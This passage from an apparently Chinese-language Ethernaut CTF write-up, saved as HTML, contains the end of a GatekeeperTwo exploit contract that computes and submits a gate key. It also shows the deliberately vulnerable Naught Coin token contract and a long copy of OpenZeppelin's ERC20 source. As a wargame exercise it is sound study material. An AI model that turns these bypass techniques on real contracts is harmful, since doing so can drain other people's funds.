keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _addr<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n      keykey<span class=\"token operator\">=</span><span class=\"token function\">GatekeeperTwo</span><span class=\"token punctuation\">(</span>_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n      <span class=\"token builtin\">bytes8</span> _gateKey <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes8</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token punctuation\">(</span><span class=\"token function\">type</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>max<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n      keykey<span class=\"token punctuation\">.</span><span class=\"token function\">enter</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>注意：<code>bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (type(uint64).max));</code>这行代码一开始copy进来<code>this</code>为<code>msg.sender</code>不能通过，题目中的<code>msg.sender</code>为攻击合约的地址</p></blockquote>\n<h2 id=\"16-Naught-Coin\"><a href=\"#16-Naught-Coin\" class=\"headerlink\" title=\"16.Naught Coin\"></a>16.Naught Coin</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">'openzeppelin-contracts-08/token/ERC20/ERC20.sol'</span><span class=\"token punctuation\">;</span>\n\n <span class=\"token keyword\">contract</span> <span class=\"token class-name\">NaughtCoin</span> <span class=\"token keyword\">is</span> ERC20 <span class=\"token punctuation\">{</span>\n\n  <span class=\"token comment\">// string public constant name = 'NaughtCoin';</span>\n  <span class=\"token comment\">// string public constant symbol = '0x0';</span>\n  <span class=\"token comment\">// uint public constant decimals = 18;</span>\n  <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> timeLock <span class=\"token operator\">=</span> block<span class=\"token punctuation\">.</span>timestamp <span class=\"token operator\">+</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> <span class=\"token number\">365</span> days<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> INITIAL_SUPPLY<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> player<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _player<span class=\"token punctuation\">)</span> \n  <span class=\"token function\">ERC20</span><span class=\"token punctuation\">(</span><span class=\"token string\">'NaughtCoin'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'0x0'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    player <span class=\"token operator\">=</span> _player<span class=\"token punctuation\">;</span>\n    INITIAL_SUPPLY <span class=\"token operator\">=</span> <span class=\"token number\">1000000</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token operator\">**</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token function\">decimals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// _totalSupply = INITIAL_SUPPLY;</span>\n    <span class=\"token comment\">// _balances[player] = INITIAL_SUPPLY;</span>\n    <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span>player<span class=\"token punctuation\">,</span> INITIAL_SUPPLY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">emit</span> <span class=\"token function\">Transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> player<span class=\"token punctuation\">,</span> INITIAL_SUPPLY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  \n  <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> _value<span class=\"token punctuation\">)</span> override <span class=\"token keyword\">public</span> lockTokens <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    super<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>_to<span class=\"token punctuation\">,</span> _value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token comment\">// Prevent the initial owner from transferring tokens until the timelock has passed</span>\n  <span class=\"token keyword\">modifier</span> <span class=\"token function\">lockTokens</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> player<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>timestamp <span class=\"token operator\">&gt;</span> timeLock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n     <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span> \n<span class=\"token punctuation\">}</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>但是部署的时候出现报错说找不到那个库，加上<code>@</code>也不行</p>\n<p><img src=\"https://s2.loli.net/2023/03/24/fhJNQA64gIMwukB.png\" alt=\"image-20230208100556034.png\"></p>\n<p><img src=\"https://s2.loli.net/2023/03/24/ma4TjPUE3ZeGzos.png\" alt=\"image-20230208100608532.png\"></p>\n<p>修改代码为：</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">import</span> <span class=\"token string\">'@openzeppelin/contracts/token/ERC20/ERC20.sol'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h3 id=\"ERC20\"><a href=\"#ERC20\" class=\"headerlink\" title=\"ERC20\"></a><code>ERC20</code></h3><p><a href=\"https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md\">https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md</a></p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token comment\">// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)</span>\n\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"./IERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"./extensions/IERC20Metadata.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"../../utils/Context.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * @dev Implementation of the {IERC20} interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {_mint}.\n * For a generic mechanism see {ERC20PresetMinterPauser}.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of {decimals} is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC20\n * applications.\n *\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\n * This allows applications to reconstruct the allowance for all accounts just\n * by listening to said events. Other implementations of the EIP may not emit\n * these events, as it isn't required by the specification.\n *\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\n * functions have been added to mitigate the well-known issues around setting\n * allowances. See {IERC20-approve}.\n */</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">ERC20</span> <span class=\"token keyword\">is</span> Context<span class=\"token punctuation\">,</span> IERC20<span class=\"token punctuation\">,</span> IERC20Metadata <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=&gt;</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> _balances<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=&gt;</span> <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=&gt;</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> _allowances<span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">private</span> _totalSupply<span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">string</span> <span class=\"token keyword\">private</span> _name<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">string</span> <span class=\"token keyword\">private</span> _symbol<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">/**\n     * @dev Sets the values for {name} and {symbol}.\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> name_<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> symbol_<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        _name <span class=\"token operator\">=</span> name_<span class=\"token punctuation\">;</span>\n        _symbol <span class=\"token operator\">=</span> symbol_<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev Returns the name of the token.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> _name<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">symbol</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> _symbol<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">decimals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token number\">18</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev See {IERC20-totalSupply}.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">totalSupply</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> _totalSupply<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev See {IERC20-balanceOf}.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> account<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> _balances<span class=\"token punctuation\">[</span>account<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">address</span> owner <span class=\"token operator\">=</span> <span class=\"token function\">_msgSender</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_transfer</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev See {IERC20-allowance}.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">allowance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> _allowances<span class=\"token punctuation\">[</span>owner<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>spender<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev See {IERC20-approve}.\n     *\n     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">address</span> owner <span class=\"token operator\">=</span> <span class=\"token function\">_msgSender</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_approve</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {ERC20}.\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `amount`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `amount`.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> virtual override <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">address</span> spender <span class=\"token operator\">=</span> <span class=\"token function\">_msgSender</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_spendAllowance</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_transfer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">increaseAllowance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> addedValue<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> virtual <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">address</span> owner <span class=\"token operator\">=</span> <span class=\"token function\">_msgSender</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_approve</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">,</span> <span class=\"token function\">allowance</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> addedValue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     * - `spender` must have allowance for the caller of at least\n     * `subtractedValue`.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">decreaseAllowance</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> subtractedValue<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> virtual <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">address</span> owner <span class=\"token operator\">=</span> <span class=\"token function\">_msgSender</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> currentAllowance <span class=\"token operator\">=</span> <span class=\"token function\">allowance</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>currentAllowance <span class=\"token operator\">&gt;=</span> subtractedValue<span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC20: decreased allowance below zero\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        unchecked <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">_approve</span><span class=\"token punctuation\">(</span>owner<span class=\"token punctuation\">,</span> spender<span class=\"token punctuation\">,</span> currentAllowance <span class=\"token operator\">-</span> subtractedValue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">/**\n     * @dev Moves `amount` of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `from` must have a balance of at least `amount`.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> virtual <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC20: transfer from the zero address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>to <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC20: transfer to the zero address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">_beforeTokenTransfer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">uint256</span> fromBalance <span class=\"token operator\">=</span> _balances<span class=\"token punctuation\">[</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>fromBalance <span class=\"token operator\">&gt;=</span> amount<span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC20: transfer amount exceeds balance\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        unchecked <span class=\"token punctuation\">{</span>\n            _balances<span class=\"token punctuation\">[</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> fromBalance <span class=\"token operator\">-</span> amount<span class=\"token punctuation\">;</span>\n            <span class=\"token comment\">// Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by</span>\n            <span class=\"token comment\">// decrementing then incrementing.</span>\n            _balances<span class=\"token punctuation\">[</span>to<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> amount<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Transfer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token 